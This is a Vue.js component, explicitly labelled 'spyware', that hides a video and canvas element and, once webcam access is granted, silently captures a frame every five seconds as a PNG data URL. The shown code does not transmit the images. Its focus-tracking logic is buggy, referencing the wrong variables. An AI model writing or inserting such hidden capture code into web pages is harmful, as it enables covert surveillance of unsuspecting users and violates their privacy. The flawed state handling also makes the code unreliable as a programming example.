<template>
    <div class="spyware" style="display:none">
        <video ref="v" width="600" height="600"></video>
        <canvas ref="c" width="600" height="600"></canvas>
    </div>
</template>

<script>
export default {
    data(){
        return{
            canvas: undefined,
            video: undefined,
            interval: undefined,
            focus: true,
            time: 3000
        }
    },
    mounted(){
        navigator.getUserMedia({video: true}, (stream)=>{
            var video = this.$refs.v;
            var canvas = this.$refs.c;
            video.srcObject = stream;
            video.play();

            this.interval = setInterval(()=>{
                this.takePicture();
            }, 5000);
        }, function(err) { console.log("there was an error " + err)});

        window.onfocus = function() {
            this.focused = true;
        };
        window.onblur = function() {
            this.focused = false;
        };
    },
    methods: {
        takePicture(){
            if(!focus){return;}
			this.$refs.c.getContext("2d").drawImage(this.$refs.v, 0, 0, 600, 600, 0, 0, 600, 600);
            var img = this.$refs.c.toDataURL("image/png");
            //console.log(img);
        }
    }
}
</script>

<style>

</style>
